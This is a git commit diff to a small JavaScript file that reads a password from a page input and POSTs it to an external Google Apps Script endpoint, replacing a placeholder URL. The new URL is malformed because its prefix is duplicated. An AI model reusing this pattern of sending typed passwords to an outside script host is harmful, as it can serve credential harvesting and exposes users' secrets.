8edaf2d07259babb170e575b5768c5b8245f464d
tiumbj <37504590+tiumbj@users.noreply.github.com>
2025-03-13 10:48:48 +0700

    Update send_password.js

--- send_password.js
+++ send_password.js
@@ -1,9 +1,9 @@
 function sendPassword() {
     var password = document.getElementById("passwordInput").value;
-    fetch('https://your-firebase-function-url.com/send', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password: password })
+    fetch("https://script.google.com/macros/s/https://script.google.com/macros/s/AKfycbzTr5e-vugJIz9AGhKgur81CUujxkPJGYWUeTK2mVFyqLfHWCobGHVEKOECoe9HZNr1/exec", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ password: password })
     }).then(response => {
         if (response.ok) {
             alert("บันทึกรหัสแล้ว ล็อกหน้าจอของคุณ!");
